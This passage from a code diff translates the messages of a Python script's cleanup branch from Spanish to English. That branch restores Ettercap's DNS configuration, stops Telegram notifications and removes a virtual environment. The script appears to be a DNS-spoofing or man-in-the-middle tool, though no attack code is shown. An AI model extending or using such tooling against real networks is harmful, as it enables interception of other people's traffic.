                 subprocess.run("sudo mv /etc/ettercap/etter.dns.bak /etc/ettercap/etter.dns", shell=True, check=False)
-                print("[+] Configuración de Ettercap DNS restaurada.")
+                print(GREEN + "[+] Ettercap DNS configuration restored." + RESET)
             else:
-                print("[+] No se encontró backup de /etc/ettercap/etter.dns, se omite restauración.")
+                print(CYAN + "[+] No backup of /etc/ettercap/etter.dns found, skipping restoration." + RESET)
                 
-            # Detener notificaciones si están en ejecución
-            stop_notificaciones_telegram()  
+            # Stop notifications if they are running
+            stop_telegram_notifications()  
             
-            # Eliminar el entorno virtual para dejar todo como estaba
+            # Remove the virtual environment to leave everything as it was
             if os.path.exists("venv"):
-                print("[+] Eliminando entorno virtual...")
+                print(GREEN + "[+] Removing virtual environment..." + RESET)
                 shutil.rmtree("venv")
             
             break
         else:
-            print("[-] Opción inválida, intenta de nuevo.")
+            print(RED + "[-] Invalid option, please try again." + RESET)
+
 
 if __name__ == "__main__":
     main()
